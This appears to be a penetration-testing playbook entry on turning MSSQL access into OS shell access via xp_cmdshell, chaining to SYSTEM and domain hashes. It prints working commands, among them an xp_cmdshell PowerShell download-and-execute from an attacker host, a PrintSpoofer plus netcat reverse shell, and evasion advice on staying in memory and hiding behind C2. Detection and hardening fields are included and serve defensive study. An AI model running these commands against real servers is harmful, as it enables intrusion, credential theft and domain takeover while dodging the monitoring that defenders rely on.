notes:
=== MSSQL xp_cmdshell — Shell Access via SQL ===
Convert SQL access into OS command execution.

=== ATTACK FLOW ===
1. Discover credentials: Snaffler for logins.sql on shares, Responder for NTLMv2 hash
2. Authenticate to MSSQL:
   python3 mssqlclient.py domain/user:pass@<IP> -windows-auth
3. Enable xp_cmdshell (requires sysadmin role):
   SQL> enable_xp_cmdshell
   Manual method:
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
4. Execute OS commands:
   SQL> xp_cmdshell whoami /priv
   SQL> xp_cmdshell powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

=== CREDENTIAL SOURCES FOR MSSQL ===
File shares containing logins.sql, web.config, appsettings.json
Snaffler: .\Snaffler.exe -s -d <domain> -o snaffler.log -v data
Responder + LLMNR → MSSQL service account NTLMv2 hash → crack offline

=== SERVICE ACCOUNT PRIVILEGES ===
MSSQL runs as: NT SERVICE\MSSQL$INSTANCE or dedicated service account
These almost always have SeImpersonatePrivilege enabled
xp_cmdshell → whoami /priv confirms → JuicyPotato/PrintSpoofer → SYSTEM

=== CHAINING CONTEXT ===
Share enum → logins.sql → mssqlclient.py → xp_cmdshell → SeImpersonate → SYSTEM → domain hashes
SQL Server linked servers: EXEC ('xp_cmdshell ''cmd''') AT [linked_server] → RCE on linked host
MSSQL on DC → SYSTEM on DC → secretsdump → all domain hashes

=== WHAT TO LOOK FOR ===
xp_cmdshell already enabled (legacy configs) → immediate shell
MSSQL running as SA or local admin → highest privilege path
Linked servers → lateral movement via SQL queries across DB servers
SQL Agent jobs running as higher-privilege accounts → hijack job scripts

recommended.note: Escalate the SeImpersonate token to SYSTEM.

name: MSSQL - Connect and Enable xp_cmdshell
description: Connect to MSSQL with Windows auth, enable xp_cmdshell, and run OS commands as the SQL service account. The service account frequently holds SeImpersonatePrivilege - the entry point for a potato attack.

defense.why_it_works: xp_cmdshell is a SQL Server extended stored procedure that executes OS commands as the SQL service account. When disabled (default), it can be re-enabled by a sysadmin using sp_configure. If the attacker has sysadmin access (or can impersonate a sysadmin via EXECUTE AS), enabling xp_cmdshell provides OS shell access at the SQL service account's privilege level — often Local System or a service account with SeImpersonatePrivilege.
defense.prerequisites: SQL Server sysadmin access (or CONTROL SERVER privilege). mssqlclient.py or SQL Server Management Studio access. sp_configure permissions.
defense.impact: OS command execution as the SQL Server service account. If the service account has SeImpersonatePrivilege (common for MSSQL), chaining JuicyPotato or PrintSpoofer achieves SYSTEM. Enables data exfiltration, lateral movement, and privilege escalation.
defense.detection: sp_configure 'xp_cmdshell' execution (SQL Server Audit). xp_cmdshell stored procedure called in SQL audit log. SQL Server error log: 'Configuration option xp_cmdshell changed'. Unusual OS processes spawned as SQL service account.
defense.artifacts: SQL Server audit: sp_configure 'show advanced options' + sp_configure 'xp_cmdshell' | OS process: cmd.exe spawned by sqlservr.exe | SQL error log: xp_cmdshell enabled
defense.prevention: Keep xp_cmdshell disabled (default). Apply principle of least privilege to SQL logins. Audit sysadmin role membership. Enable SQL Server auditing. Run SQL Server as a dedicated low-privilege service account — not Local System.
defense.misconfiguration: SQL Server service running as Local System or a high-privilege account. Sysadmin access granted broadly to application accounts. xp_cmdshell enabled by default or easily re-enabled by application accounts.
defense.vulnerable_config:
# mssqlclient.py exploits sysadmin access:
mssqlclient.py sql_svc@10.129.43.13 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
# Output: nt service\mssql$sqlexpress

# Chain to SYSTEM via SeImpersonate:
SQL> xp_cmdshell 'c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe attacker 443 -e cmd"'
defense.secure_config:
# Keep xp_cmdshell disabled:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

# Run MSSQL as dedicated low-privilege service account:
# MSSQL Configuration Manager: Services > MSSQL service > Log On As
# Use: INLANEFREIGHT\svc_mssql (dedicated, no admin rights)

# Restrict sysadmin role:
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1
defense.evasion: Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel.

variations.label: Enable + run in one query
variations.command: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
